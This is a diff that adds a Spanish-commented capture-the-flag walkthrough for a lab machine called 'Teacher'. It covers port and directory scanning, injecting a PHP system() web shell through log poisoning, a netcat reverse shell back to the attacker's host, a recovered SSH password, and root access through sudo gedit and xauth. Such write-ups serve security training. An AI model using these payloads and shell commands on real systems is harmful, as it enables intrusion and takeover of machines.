@@ -1,0 +1,92 @@
+//buscamos la ip de la máquina local
+sudo arp-scan --localnet
+
+//escaneamos puertos
+nmap -p- -sCV -T4 -v -Pn -oN targeted  192.168.1.46
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 1e:21:69:d3:57:da:3a:04:0b:6f:f4:50:fb:97:13:10 (RSA)
+|   256 36:ee:7f:57:1d:a5:b5:ce:1f:41:ba:b0:43:32:2e:ff (ECDSA)
+|_  256 f2:bd:80:dd:e5:05:02:49:c3:3b:9f:83:29:cb:54:96 (ED25519)
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+| http-methods:
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.54 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+//escaneamos directorios
+dirsearch -u http://192.168.1.46 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f -t 64 -e txt,html,php
+
+[14:55:58] Starting:
+[14:55:59] 403 -  277B  - /icons/
+[14:55:59] 200 -  315B  - /index.html
+[14:56:03] 200 -   23B  - /log.php
+[14:56:04] 200 -  676B  - /manual/
+[14:56:04] 301 -  313B  - /manual  ->  http://192.168.1.46/manual/
+[14:56:04] 200 -   12B  - /access.php
+
+wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc=404 --hh=12 -u 'http://192.168.1.46/access.php?FUZZ=test'
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000529:   200        0 L      2 W        16 Ch       "id"
+
+//insertamos PAYLOAD
+http://192.168.1.46/access.php?id=%3C?php system($_GET["pwned"]); ?%3E
+
+//insertamos REVERSE SHELL
+http://192.168.1.46/log.php?pwned=nc%20-e%20/bin/bash%20192.168.1.45%205555
+
+//nos ponemos en escucha para la reverse shell
+nc -nlvp 5555
+
+//TTY Spawn Shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+//despues de buscar... encontramos un pdf en la web
+find / -name '*.pdf' 2>/dev/null
+/var/www/html/e14e1598b4271d8449e7fcda302b7975.pdf
+
+//desargamos el pdf
+http://192.168.1.46/e14e1598b4271d8449e7fcda302b7975.pdf
+
+//la pass es:
+PASS=++ank++uTe++h++s
+
+//abrimos a con ssh
+ssh mrteacher@192.168.1.46
+
+//escalada de privilegio
+sudo -l
+Matching Defaults entries for mrteacher on Teacher:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User mrteacher may run the following commands on Teacher:
+    (ALL : ALL) NOPASSWD: /bin/gedit, /bin/xauth
+
+
+//en internet encontramos ayuda
+https://www.thegeekdiary.com/how-to-set-x11-forwarding-export-remote-display-for-users-who-switch-accounts-using-sudo/
+
+//abrimos ssh con parametro -X
+ssh -X mrteacher@192.168.1.46
+
+
+//escalada
+mrteacher@Teacher:~$ xauth list $DISPLAY
+Teacher/unix:10  MIT-MAGIC-COOKIE-1  //poner hash - es dinamico//
+
+mrteacher@Teacher:~$ echo $DISPLAY
+localhost:10.0
+
+mrteacher@Teacher:~$ sudo xauth add Teacher/unix:10  MIT-MAGIC-COOKIE-1  //poner hash - es dinamico//
+
+mrteacher@Teacher:~$ export DISPLAY=localhost:10.0
+mrteacher@Teacher:~$ sudo gedit
+
+//cuando se abre GEDIT, se ejecuta como root, abrimos /root/root.txt
+Hap++Ba++2S++00l
